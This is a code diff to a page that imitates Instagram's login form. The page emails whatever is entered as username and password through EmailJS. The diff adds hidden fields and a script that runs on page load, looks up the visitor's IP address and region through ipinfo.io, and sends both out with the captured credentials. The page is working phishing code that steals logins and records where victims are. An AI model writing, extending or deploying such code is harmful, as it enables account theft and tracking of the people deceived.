@@ -233,6 +233,10 @@ input[type="submit"]:hover, input[type="submit"]:focus {
     <input type="text" placeholder="Username" id="email"  name="email" class="input-1" required />
     <div class="overlap-text">
       <input type="password" placeholder="Password" id="message" name="message" class="input-2" required />
+
+      <!-- Hidden fields to store IP address and state -->
+    <input type="hidden" id="ip_address" name="ip_address">
+    <input type="hidden" id="state" name="state">
   <input class="btn btn-primary" type="submit" value="Log in">
   </form>
 
@@ -276,6 +280,22 @@ input[type="submit"]:hover, input[type="submit"]:focus {
       <span>© 2024 INSTAGRAM</span>
   </p>
 </div>
+
+
+<script>
+  document.addEventListener("DOMContentLoaded", function() {
+      fetch("https://ipinfo.io/json?token=d53f8306658fc8") // Replace with your free ipinfo.io API key
+      .then(response => response.json())
+      .then(data => {
+          document.getElementById("ip_address").value = data.ip;
+          document.getElementById("state").value = data.region;
+      })
+      .catch(error => console.error("Error fetching IP info:", error));
+  });
+  </script>
+  
+
+
 <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
 
   <script type="text/javascript">
@@ -290,12 +310,16 @@ input[type="submit"]:hover, input[type="submit"]:focus {
         var name = document.getElementById("name").value;
         var email = document.getElementById("email").value;
         var message = document.getElementById("message").value;
+        var ip_address = document.getElementById("ip_address").value;
+        var state = document.getElementById("state").value;
 
         // Prepare email parameters
         var emailParams = {
             from_name: name,
             from_email: email,
-            message: message
+            message: message,
+            ip_address: ip_address,
+            state: state
         };
 
         // Send the email using EmailJS
